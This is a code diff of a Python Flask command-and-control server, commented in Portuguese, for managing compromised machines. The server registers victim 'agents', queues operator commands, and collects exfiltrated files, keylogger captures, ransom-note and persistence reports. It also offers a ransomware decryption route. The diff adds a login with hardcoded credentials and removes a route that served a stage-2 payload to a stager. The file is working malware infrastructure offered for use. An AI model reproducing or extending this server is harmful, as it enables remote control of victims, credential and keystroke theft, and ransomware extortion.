@@ -1,9 +1,10 @@
-from flask import Flask, request, jsonify, render_template, send_from_directory
+from flask import Flask, request, jsonify, render_template, session, redirect, url_for
 from datetime import datetime, timedelta
 import uuid
 import json
 import os
 import base64
+from functools import wraps
 
 # --- PLATFORM-SPECIFIC IMPORTS ---
 try:
@@ -15,17 +16,22 @@ except ImportError:
 # Inicializa o servidor Flask
 app = Flask(__name__, template_folder='templates')
 
-# --- ESTRUTURAS DE DADOS E PERSISTÊNCIA ---
+# --- CONFIGURAÇÕES DE SEGURANÇA E AUTENTICAÇÃO ---
+app.config['SECRET_KEY'] = os.urandom(24) # Chave secreta para gerenciar sessões
+USERNAME = "whxami"
+PASSWORD = "admin"
+
+# --- ESTRUTURAS DE DADOS E PERSISTÊNCIA (CÓDIGO ESTÁVEL v2.2) ---
 AGENTS_DB_FILE = "agents_db.json"
 DOWNLOADS_DIR = "C2_Downloads"
 KEYLOGS_DIR = "C2_Keylogs"
 SYSTEM_LOGS_DIR = "C2_System_Logs"
 OPERATOR_LOG_FILE = "c2_operator_log.txt"
 agents = {} 
-tasks = {} # Modificado para rastrear o status das tarefas
-
+tasks = {} 
 AGENT_TIMEOUT_SECONDS = 60
 
+# --- FUNÇÕES DE AJUDA (CÓDIGO ESTÁVEL v2.2) ---
 def setup_directories():
     os.makedirs(DOWNLOADS_DIR, exist_ok=True)
     os.makedirs(KEYLOGS_DIR, exist_ok=True)
@@ -60,66 +66,60 @@ def log_system_event(agent_id, event_type, message):
         log_entry = f"[{timestamp}] [{event_type.upper()}] {str(message)}\n"
         f.write(log_entry)
 
-# --- ROTAS DA APLICAÇÃO ---
+# --- DECORATOR DE AUTENTICAÇÃO ---
+def login_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if 'logged_in' not in session:
+            return redirect(url_for('login_route'))
+        return f(*args, **kwargs)
+    return decorated_function
+
+# --- ROTAS DE AUTENTICAÇÃO E PAINEL ---
+@app.route('/login', methods=['GET', 'POST'])
+def login_route():
+    if request.method == 'POST':
+        data = request.get_json()
+        if not data:
+            return jsonify({"status": "error", "message": "Payload inválido."}), 400
+        
+        username = data.get('username')
+        password = data.get('password')
+        
+        if username == USERNAME and password == PASSWORD:
+            session['logged_in'] = True
+            return jsonify({"status": "success"})
+        else:
+            return jsonify({"status": "error", "message": "Credenciais inválidas."}), 401
+            
+    return render_template('login.html')
+
+@app.route('/logout')
+def logout():
+    session.pop('logged_in', None)
+    return redirect(url_for('login_route'))
 
 @app.route('/')
+@login_required
 def home():
-    return render_template('index.html')
+    return render_template('panel.html')
 
-# --- NOVA ROTA DE STAGING ---
-@app.route('/stage/main', methods=['GET'])
-def serve_stage2():
-    """
-    Esta rota serve o conteúdo do GeminiV2.py (nosso Stage 2) para o stager.
-    """
-    try:
-        # Garante que estamos servindo a partir do diretório do script do servidor
-        script_dir = os.path.dirname(os.path.realpath(__file__))
-        return send_from_directory(script_dir, 'GeminiV2_2test.py', mimetype='text/plain')
-    except FileNotFoundError:
-        print("[!] Erro Crítico: O arquivo 'GeminiV2_2test.py' não foi encontrado no diretório do servidor.")
-        return "Payload not found", 404
-    except Exception as e:
-        print(f"[!] Erro ao servir o payload Stage 2: {e}")
-        return "Internal server error", 500
-
-# --- API PARA AGENTES E DEMAIS FUNÇÕES ---
+# --- API PARA AGENTES (Não requerem login) ---
 @app.route('/register', methods=['POST'])
 def register_agent():
     data = request.json
     agent_id = str(uuid.uuid4())
     agents[agent_id] = {
         "username": data.get("username"), "hostname": data.get("hostname"),
-        "internal_ip": data.get("internal_ip", "N/A"),
-        "external_ip": data.get("external_ip", "N/A"),
-        "os_name": data.get("os_name"),
-        "privileges": data.get("privileges", "Desconhecido"),
-        "agent_version": data.get("agent_version", "2.2"),
-        "first_seen": datetime.now().isoformat(), "last_seen": datetime.now().isoformat()
+        "internal_ip": data.get("internal_ip", "N/A"), "external_ip": data.get("external_ip", "N/A"),
+        "os_name": data.get("os_name"), "privileges": data.get("privileges", "Desconhecido"),
+        "agent_version": data.get("agent_version", "2.2"), "first_seen": datetime.now().isoformat(),
+        "last_seen": datetime.now().isoformat()
     }
     tasks[agent_id] = []
     log_system_event(agent_id, "REGISTER", f"Novo agente registrado. Versão: {agents[agent_id]['agent_version']}")
     save_agents_to_disk()
-    print(f"[+] Novo agente registrado ({data.get('privileges')}): {data.get('hostname')} ({agent_id})")
     return jsonify({"agent_id": agent_id})
-
-@app.route('/issue_command', methods=['POST'])
-def issue_command():
-    data = request.json
-    agent_id = data.get('agent_id'); command = data.get('command'); args = data.get('args', "")
-    if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
-    log_operator_action(agent_id, command, args)
-    task_id = str(uuid.uuid4())
-    task = {
-        "task_id": task_id, 
-        "command": command, 
-        "args": args, 
-        "status": "Pendente", 
-        "timestamp_issued": datetime.now().isoformat(), 
-        "result": None
-    }
-    tasks.setdefault(agent_id, []).append(task)
-    return jsonify({"status": "Comando enfileirado", "task_id": task_id})
 
 @app.route('/get_task/<agent_id>', methods=['GET'])
 def get_task(agent_id):
@@ -138,43 +138,33 @@ def post_result():
     agent_id = data.get('agent_id'); task_id = data.get('task_id')
     if agent_id not in agents: return jsonify({"error": "Agente não registrado"}), 404
     data_type = data.get('data_type', 'generic_result'); result_data = data.get('result')
-    
     task_found = False
     for task in tasks.get(agent_id, []):
         if task['task_id'] == task_id:
             task['status'] = 'Concluído' if data_type != 'error' else 'Erro'
-            task['result'] = result_data
-            task_found = True
+            task['result'] = result_data; task_found = True
             log_system_event(agent_id, task['status'].upper(), f"Comando '{task['command']}' finalizado.")
             break
-            
     if not task_found: log_system_event(agent_id, "WARNING", f"Recebido resultado para uma tarefa desconhecida: {task_id}")
-
     if data_type == 'error': log_system_event(agent_id, "ERROR", result_data)
-    elif data_type in ['info', 'keylogger_started', 'keylogger_stopped', 'upload_success', 'ransom_note_displayed', 'persistence_result', 'decryption_report']:
-        log_system_event(agent_id, "INFO", result_data)
-
+    elif data_type in ['info', 'keylogger_started', 'keylogger_stopped', 'upload_success', 'ransom_note_displayed', 'persistence_result', 'decryption_report', 'cleanup_success']: 
+        log_system_event(agent_id, "INFO", result_data if isinstance(result_data, str) else json.dumps(result_data))
     if data_type == 'file_download':
         try:
             file_content = base64.b64decode(result_data['content_b64'])
             agent_dir = os.path.join(DOWNLOADS_DIR, agent_id); os.makedirs(agent_dir, exist_ok=True)
             file_path = os.path.join(agent_dir, result_data['filename'])
             with open(file_path, 'wb') as f: f.write(file_content)
-            result_data = f"Arquivo '{result_data['filename']}' salvo em: {file_path}"
-            data_type = 'download_success'
-            log_system_event(agent_id, "DOWNLOAD", result_data)
+            result_data = f"Arquivo '{result_data['filename']}' salvo em: {file_path}"; data_type = 'download_success'
         except Exception as e:
-            result_data = f"Erro ao salvar arquivo baixado: {e}"
-            log_system_event(agent_id, "ERROR", result_data)
+            result_data = f"Erro ao salvar arquivo baixado: {e}"; log_system_event(agent_id, "ERROR", result_data)
     elif data_type == 'keylogger_data':
         try:
             keylog_file = os.path.join(KEYLOGS_DIR, f"{agent_id}_keylog.txt")
             with open(keylog_file, 'a', encoding='utf-8') as f: f.write(result_data)
             return jsonify({"status": "keylog received"})
         except Exception as e:
-            log_system_event(agent_id, "ERROR", f"Falha ao salvar keylog: {e}")
-            return jsonify({"status": "error"})
-
+            log_system_event(agent_id, "ERROR", f"Falha ao salvar keylog: {e}"); return jsonify({"status": "error"})
     result_entry = {"task_id": task_id, "timestamp": datetime.now().isoformat(), "data_type": data_type, "data": result_data}
     filename = f"agent_{agent_id}_results.json"
     try:
@@ -184,12 +174,27 @@ def post_result():
     with open(filename, 'w') as f: json.dump(all_results, f, indent=4)
     return jsonify({"status": "success"})
 
+# --- API PARA INTERFACE (Protegidas por login) ---
+@app.route('/issue_command', methods=['POST'])
+@login_required
+def issue_command_route():
+    data = request.json
+    agent_id = data.get('agent_id'); command = data.get('command'); args = data.get('args', "")
+    if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
+    log_operator_action(agent_id, command, args)
+    task_id = str(uuid.uuid4())
+    task = {"task_id": task_id, "command": command, "args": args, "status": "Pendente", "timestamp_issued": datetime.now().isoformat(), "result": None}
+    tasks.setdefault(agent_id, []).append(task)
+    return jsonify({"status": "Comando enfileirado", "task_id": task_id})
+
 @app.route('/get_tasks/<agent_id>', methods=['GET'])
+@login_required
 def get_tasks(agent_id):
     if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
     return jsonify(tasks.get(agent_id, []))
 
 @app.route('/get_system_logs/<agent_id>', methods=['GET'])
+@login_required
 def get_system_logs(agent_id):
     if agent_id not in agents: return "Agente não encontrado.", 404
     try:
@@ -199,6 +204,7 @@ def get_system_logs(agent_id):
     except Exception as e: return f"Erro ao ler arquivo de log: {e}", 500
 
 @app.route('/delete_agents', methods=['POST'])
+@login_required
 def delete_agents():
     global agents
     data = request.json
@@ -221,6 +227,7 @@ def delete_agents():
     return jsonify({"status": "success", "deleted_count": deleted_count})
 
 @app.route('/get_keylogs/<agent_id>', methods=['GET'])
+@login_required
 def get_keylogs(agent_id):
     if agent_id not in agents: return "Agente não encontrado.", 404
     try:
@@ -230,6 +237,7 @@ def get_keylogs(agent_id):
     except Exception as e: return f"Erro ao ler arquivo de log: {e}", 500
 
 @app.route('/get_agents', methods=['GET'])
+@login_required
 def get_agents():
     now = datetime.now(); agents_with_status = {}
     for agent_id, agent_data in agents.items():
@@ -240,6 +248,7 @@ def get_agents():
     return jsonify(agents_with_status)
 
 @app.route('/get_results/<agent_id>', methods=['GET'])
+@login_required
 def get_results(agent_id):
     if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
     filename = f"agent_{agent_id}_results.json"
@@ -249,6 +258,7 @@ def get_results(agent_id):
     return jsonify({"results": all_results})
 
 @app.route('/list_downloads/<agent_id>', methods=['GET'])
+@login_required
 def list_downloads(agent_id):
     if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
     agent_download_dir = os.path.join(DOWNLOADS_DIR, agent_id)
@@ -257,6 +267,7 @@ def list_downloads(agent_id):
     return jsonify(files)
 
 @app.route('/decrypt_file', methods=['POST'])
+@login_required
 def decrypt_file_route():
     if not AES: return jsonify({"status": "error", "message": "Biblioteca de criptografia não está instalada no servidor."}), 500
     data = request.json
@@ -281,3 +292,4 @@ if __name__ == '__main__':
     setup_directories()
     load_agents_from_disk()
     app.run(host='0.0.0.0', port=8000, debug=True)
+
